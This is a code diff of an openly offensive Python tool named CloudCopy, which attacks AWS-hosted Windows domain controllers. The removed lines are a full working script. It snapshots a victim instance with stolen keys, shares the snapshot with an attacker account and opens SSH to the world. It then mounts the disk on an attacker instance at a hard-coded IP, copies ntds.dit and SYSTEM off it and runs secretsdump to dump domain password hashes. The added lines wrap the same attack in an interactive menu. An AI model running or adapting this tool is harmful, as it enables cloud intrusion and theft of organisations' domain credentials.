@@ -1,189 +1,202 @@
-import argparse
-import sys
-import time
-import warnings
+import abc
+import cmd
+import glob
+import os
+import re
+import readline
 
-import boto3
-from botocore.exceptions import ClientError
-from tqdm import tqdm
+from CloudCopyUtils import CloudCopyUtils
 
-warnings.filterwarnings(action='ignore', module='.*paramiko.*')
-parser = argparse.ArgumentParser()
-parser.add_argument("youraccountid", help="your account id for stealing snapshot")
-parser.add_argument("yourinstancekey", help="your private key name (without .pem) for accessing the instance")
-parser.add_argument("localkeypath", help="local path to key for ssh'ing to new instance")
-parser.add_argument("targetaccesskey", help="target AWS Access Key for making snapshot")
-parser.add_argument("targetsecretkey", help="target AWS Secret Key for making snapshot")
-parser.add_argument("youracccesskey", help="your AWS Access Key for making instance")
-parser.add_argument("yoursecretkey", help="your AWS Secret Key for making instance")
+# These might change, I'll probably forget to update it
+REGIONS = ['us-east-2', 'us-east-1', 'us-west-1', 'us-west-2', 'ap-east-1',
+           'ap-south-1', 'ap-northeast-2', 'ap-southeast-1', 'ap-southeast-2',
+           'ap-northeast-1', 'ca-central-1', 'cn-north-1', 'cn-northwest-1',
+           'eu-central-1', 'eu-west-1', 'eu-west-2', 'eu-west-3', 'eu-north-1',
+           'sa-east-1', 'us-gov-east-1', 'us-gov-west-1']
 
-args = parser.parse_args()
-
-def viewBar(a,b):
-    # original version
-    res = a/int(b)*100
-    sys.stdout.write('\rComplete precent: %.2f %%' % (res))
-    sys.stdout.flush()
-
-def tqdmWrapViewBar(*args, **kwargs):
-    try:
-        from tqdm import tqdm
-    except ImportError:
-        # tqdm not installed - construct and return dummy/basic versions
-        class Foo():
-            @classmethod
-            def close(*c):
-                pass
-        return viewBar, Foo
-    else:
-        pbar = tqdm(*args, **kwargs)  # make a progressbar
-        last = [0]  # last known iteration, start at 0
-        def viewBar2(a, b):
-            pbar.total = int(b)
-            pbar.update(int(a - last[0]))  # update pbar with increment
-            last[0] = a  # update last known iteration
-        return viewBar2, pbar  # return callback, tqdmInstance
-
-
-if args.targetaccesskey is args.targetsecretkey is args.youraccountid is args.yourinstancekey is args.localkeypath is None:
-    parser.print_help()
-elif ".pem" in args.yourinstancekey:
-    print("I said no .pem for the key. Try again.")
+if 'libedit' in readline.__doc__:
+    readline.parse_and_bind("bind ^I rl_complete")
 else:
-    ec2 = boto3.client('ec2', aws_access_key_id=args.targetaccesskey, aws_secret_access_key=args.targetsecretkey)
-    instances = ec2.describe_instances()['Reservations']
-    for index, instance in enumerate(instances):
-        if 'Tags' in instance['Instances'][0]:
-            print(str(index) + ' - ' + instance['Instances'][0]['InstanceId'] + ":"
-                  + instance['Instances'][0]['Tags'][0]['Value'])
+    readline.parse_and_bind("tab: complete")
 
-    instanceIndex = int(input("which instance are we CloudCopying today?"))
-    instance = instances[instanceIndex]['Instances'][0]['InstanceId']
-    instanceVolume = instances[instanceIndex]['Instances'][0]['BlockDeviceMappings'][0]['Ebs']['VolumeId']
-    print("Instance to CloudCopy: " + instance)
-    print("Instance Volume to Snapshot: " + instanceVolume)
-    try:
-        ec2.create_snapshot(VolumeId=instanceVolume, DryRun=True)
-    except ClientError as e:
-        if e.response['Error']['Code'] == 'DryRunOperation':
-            print("Success")
-        elif e.response['Error']['Code'] == 'UnauthorizedOperation':
-            print("We do not have the Ec2:CreateSnapshot permission. This attack will not succeed. K-Bye.")
-            exit(0)
 
-    response = ec2.create_snapshot(VolumeId=instanceVolume, DryRun=False)
-    ec2Snapshot = boto3.resource('ec2', aws_access_key_id=args.targetaccesskey, aws_secret_access_key=args.targetsecretkey)
-    snapshot = ec2Snapshot.Snapshot(response['SnapshotId'])
-    print(snapshot.id)
-    snapshot.load()
-    with tqdm(total=100) as progress:
-        while snapshot.state != 'completed':
-            snapshot.load()
-            progAmount = int(snapshot.progress.split('%')[0])
-            progress.update(progAmount - progress.n)
-            time.sleep(0.1)
-            snapshot.load()
+class BaseCmdInterpreter(cmd.Cmd):
+
+    def __init__(self):
+        self.options = {'youraccountid': '', 'localkeypath': ''}
+        super(BaseCmdInterpreter, self).__init__()
+
+    def do_exit(self, args):
+        return True
+
+    def emptyline(self):
+        pass
+
+    def _complete_path(self, path):
+        if os.path.isdir(path):
+            return glob.glob(os.path.join(path, '*'))
         else:
-            progress.update(progAmount - progress.n)
+            return glob.glob(path + '*')
 
-    snapshot.modify_attribute(Attribute='createVolumePermission',
-                              CreateVolumePermission={'Add': [{'UserId': args.youraccountid}]})
+    def _complete_profiles(self):
+        from os.path import expanduser
+        home = expanduser("~")
+        credentials = open(home+"/.aws/credentials").read()
+        profiles = re.findall('\[.+\]', credentials)
+        return list(map(lambda x:x[1:-1], profiles))
 
-    print("Snapshot should have been shared. Switching to attacker account.")
-#    switch to attacker, we use the .aws file for the attacker unless the specify it
-    if args.yoursecretkey is not None and args.youracccesskey is not None:
-        ec2 = boto3.client("ec2", aws_access_key_id=args.youracccesskey, aws_secret_access_key=args.yoursecretkey)
-    else:
-        ec2 = boto3.client("ec2")
+    def do_list_hashes(self, args):
+        """list_hashes
+        Display previously gained hashes"""
+        secrets = glob.glob("./secrets*")
+        if len(secrets) > 0:
+            for secret in secrets:
+                print(open(secret).read())
+        else:
+            print("no hashes found yet")
 
-    if args.yoursecretkey is not None and args.youracccesskey is not None:
-        ec2Resource = boto3.resource("ec2", aws_access_key_id=args.youracccesskey, aws_secret_access_key=args.yoursecretkey)
-    else:
-        ec2Resource = boto3.resource("ec2")
+    def do_set(self, line):
+        """set [property] [value]
+        Set the CloudCopy properties"""
+        arguments = [l for l in line.split()]
+        if len(arguments) < 2:
+            print("Not enough arguments")
+        else:
+            self.options[arguments[0]] = arguments[1]
 
-    response = ec2.describe_snapshots(
-        SnapshotIds=[
-            snapshot.id,
-        ],
-    )['Snapshots']
-    while len(response) == 0:
-        response = ec2.describe_snapshots(
-        SnapshotIds=[
-            snapshot.id,
-        ],)['Snapshots']
-        print("Snapshot hasn't arrived, waiting...")
-        time.sleep(10)
+    def complete_set(self, text, line, begidx, endidx):
+        options = self.options.keys()
 
-    print("We have the snapshot in our control time to mount it to an instance!")
+        if 'localkeypath' in line:
+            mline = line.split(' ')[-1]
+            offs = len(mline) - len(text)
+            completions = []
+            if line.split()[-2] == 'localkeypath':
+                completions = self._complete_path(mline)
+            return [s[offs:] for s in completions if s.startswith(mline)]
+        elif 'region' in line:
+            if text:
+                completions = [f
+                               for f in REGIONS
+                               if f.startswith(text)
+                               ]
+            else:
+                completions = REGIONS
+        elif 'Profile' in line:
+            if text:
+                completions = [f
+                               for f in self._complete_profiles()
+                               if f.startswith(text)]
+            else:
+                completions = self._complete_profiles()
+        else:
+            completions = [f
+                           for f in options
+                           if f.startswith(text)
+                           ]
+        return completions
 
-    security_group_id = None
-    try:
-        existingSecurityGroup = ec2.describe_security_groups(
-            GroupNames=[
-                'CredStealerSsh',
-            ],
-        )['SecurityGroups'][0]
-        print("Found existing security group: " + existingSecurityGroup["GroupId"] + ". Someone's done this before ;)")
-        security_group_id = existingSecurityGroup["GroupId"]
-    except ClientError:
-        security_group_id = ec2.create_security_group(
-            Description='For connecting to cred stealing instance.',
-            GroupName='CredStealerSsh'
-        )['GroupId']
-        ec2.authorize_security_group_ingress(GroupId=security_group_id, IpProtocol="tcp", CidrIp="0.0.0.0/0",
-                                             FromPort=22, ToPort=22)
-        print("Finished creating security group for instance")
+    def do_show_options(self, args):
+        """show_options
+        Show CloudCopy properties and their currently set values"""
+        print(self.options)
 
-    newInstance = ec2.run_instances(
-        BlockDeviceMappings=[{
-            "DeviceName": '/dev/sdf',
-            "Ebs": {
-                "SnapshotId": snapshot.id
-            }
-        }],
-        SecurityGroupIds=[
-            security_group_id,
-        ],
-        SecurityGroups=[
-           'CredStealerSsh',
-        ],
-        ImageId='ami-0c6b1d09930fac512',
-        MaxCount=1,
-        MinCount=1,
-        InstanceType='t2.micro',
-        KeyName=args.yourinstancekey
-    )
-    newInstanceId = newInstance['Instances'][0]['InstanceId']
-    print("instance: " + newInstanceId)
 
-    instance = ec2Resource.Instance(newInstanceId)
-    while instance.state['Name'].strip() == "running":
-        print(instance.state['Name'], 'running')
-        print("Your instance will be arriving shortly...")
-        time.sleep(10)
-    print("Your instance has arrived. Time to get some sweet sweet creds!")
+class BaseCloudCopy(BaseCmdInterpreter, abc.ABC):
 
-    import paramiko
-    cbk, pbar = tqdmWrapViewBar(ascii=True, unit='b', unit_scale=True)
-    key = paramiko.RSAKey.from_private_key_file(args.localkeypath)
-    connection = paramiko.SSHClient()
-    connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    print("Connecting to instance")
-    connection.connect(hostname='35.175.243.206', username='ec2-user', pkey=key)
-    sftp = connection.open_sftp()
-    stdin, stdout, stderr = connection.exec_command("sudo mkdir /windows")
-    stdin, stdout, stderr = connection.exec_command("sudo mount /dev/xvdf1 /windows/")
-    stdin, stdout, stderr = connection.exec_command("sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user/ntds.dit")
-    stdin, stdout, stderr = connection.exec_command("sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user/SYSTEM")
-    stdin, stdout, stderr = connection.exec_command("sudo chown ec2-user:ec2-user /home/ec2-user/*")
-    print("Pulling the files...")
-    try:
-        sftp.get("/home/ec2-user/SYSTEM", "./SYSTEM", callback=cbk)
-        sftp.get("/home/ec2-user/ntds.dit", "./ntds.dit", callback=cbk)
-    except PermissionError:
-        print("hmm we don't seem to have control of the files. Maybe just sftp in yourself and run this part.")
-    sftp.close()
-    cbk = pbar = None # keeps trying to print out status after the files are already copied
-    print("finally gonna run secretsdump!")
-    import subprocess
-    subprocess.run(["secretsdump.py", "-system", "./SYSTEM", "-ntds", "./ntds.dit", "local", "-outputfile", "secrets"])
+    def __init__(self):
+        self.cloudCopier = None
+        BaseCmdInterpreter.__init__(self)
+        abc.ABC.__init__(self)
+
+    @abc.abstractmethod
+    def do_stealDCHashes(self, args):
+        """stealDCHashes
+        Initiate the CloudCopy attack to steal the ntds.dit and SYSTEM file to recreate domains hashes"""
+        pass
+
+    def stealExistingInstance(self):
+        self.cloudCopier.createInstance(self.options['localkeypath'])
+        self.cloudCopier.grabDCHashFiles(self.options['localkeypath'])
+
+    def stealNewInstance(self):
+        self.cloudCopier.listInstances()
+        if self.cloudCopier.createSnapshot():
+            print("Snapshot created, sharing it with attacker account")
+            self.cloudCopier.modifySnapshot(self.options['youraccountid'])
+        self.cloudCopier.createSecurityGroup()
+        self.cloudCopier.createInstance(self.options['localkeypath'])
+        self.cloudCopier.grabDCHashFiles(self.options['localkeypath'])
+
+
+class ProfileCloudCopy(BaseCloudCopy):
+
+    def __init__(self, parentOptions):
+        super(ProfileCloudCopy, self).__init__()
+        self.prompt = "(Profile CloudCopy)"
+        self.options = parentOptions
+        self.options['region'] = ''
+        self.options['instance_id'] = ''
+        self.options['attackerProfile'] = ''
+        self.options['victimProfile'] = ''
+
+    def do_stealDCHashes(self, args):
+        if '' not in self.options.values:
+            if self.options['instance_id'] != '':
+                self.cloudCopier = CloudCopyUtils({'type': 'profile', 'options': self.options}, 'attacker')
+                self.stealExistingInstance()
+            else:
+                self.cloudCopier = CloudCopyUtils({'type': 'profile', 'options': self.options}, 'victim')
+                self.stealNewInstance()
+        else:
+            print("Your forgot to set some properties. Make sure that no properties in 'show_options' is set to '' ")
+
+
+class ManualCloudCopy(BaseCloudCopy):
+
+    def __init__(self, parentOptions):
+        super(ManualCloudCopy, self).__init__()
+        self.prompt = "(Manual CloudCopy)"
+        self.options = parentOptions
+        self.options['region'] = ''
+        self.options['instance_id'] = ''
+        self.options['attackerAccessKey'] = ''
+        self.options['attackerSecretKey'] = ''
+        self.options['victimAccessKey'] = ''
+        self.options['victimSecretKey'] = ''
+
+    def do_stealDCHashes(self, args):
+        if self.options['instance_id'] != '':
+            self.cloudCopier = CloudCopyUtils({'type': 'manual', 'options': self.options}, 'attacker')
+            self.stealExistingInstance()
+        else:
+            self.cloudCopier = CloudCopyUtils({'type': 'manual', 'options': self.options}, 'victim')
+            self.stealNewInstance()
+
+class MainMenu(BaseCmdInterpreter):
+
+    def __init__(self):
+        super(MainMenu, self).__init__()
+        self.prompt = "(CloudCopy)"
+
+    def reset_options(self):
+        self.options = {'youraccountid': '', 'localkeypath': ''}
+
+    def do_profile_login(self, args):
+        """profile_login
+        CloudCopy attack using .aws/credential profiles to authenticate"""
+        sub_cmd = ProfileCloudCopy(self.options)
+        sub_cmd.cmdloop()
+        self.reset_options()
+
+    def do_manual_login(self, args):
+        """manual_login
+        CloudCopy attack using manually set attacker/victim access/secret keys to authenticate"""
+        sub_cmd = ManualCloudCopy(self.options)
+        sub_cmd.cmdloop()
+        self.reset_options()
+
+
+if __name__ == '__main__':
+    cmd = MainMenu()
+    cmd.cmdloop()
